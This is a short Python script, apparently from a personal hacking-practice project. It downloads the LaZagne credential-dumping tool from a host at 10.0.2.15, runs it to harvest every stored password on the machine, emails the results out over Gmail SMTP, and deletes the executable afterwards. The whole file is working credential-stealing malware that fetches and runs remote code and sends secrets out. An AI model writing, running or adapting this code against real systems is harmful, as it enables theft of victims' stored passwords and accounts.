#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

import subprocess
import smtplib #SMTP services
import requests #HTTP requests
import os
import tempfile

def send_mail(email, password, msg):
    '''
    Send e-mail to myself with detected stored passwords.

    Args:
        email (str): e-mail address

        password (str): Password of the e-mail address

        msg (str): Detected stored passwords
    '''
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    #Login to e-mail with specified credentials
    server.login(email, password)
    #Send the stored password to myself
    server.sendmail(email, email, msg)
    server.quit()


def credentials():
    '''
    Read credentials of the user from the file.

    Returns:
        mail (str): e-mail address of the user

        password (str): password address of the user
    '''

    with open('credentials.txt', "r") as f:
        credentials = ((f.read()).split('\n'))[0].split(' ')

    mail = credentials[0]
    password = credentials[1]

    return mail, password


def download(url):
    '''
    Download a file using HTTP GET request.

    Args:
        url (str): URL of the file you want to download
    '''

    response = requests.get(url)
    
    file_name = url.split('/')[-1]

    with open(file_name, 'wb') as f:
        f.write(response.content)


def main():
    #Read credentials from the user
    mail, password = credentials()
    print(tempfile.gettempdir())
    
    #Change working directory
    os.chdir(tempfile.gettempdir())
    
    #Download LaZagne software, used to detect stored passwords
    download("http://10.0.2.15/files/lazagne.exe")

    #Obtain stored passwords using LaZagne
    result = subprocess.check_output('lazagne.exe all', shell=True)

    #Send stored passwords through e-mail
    send_mail(mail, password, result)

    #Remove the executable file of LaZagne from the temporary directory
    os.remove('lazagne.exe')

if __name__=='__main__':
    main()
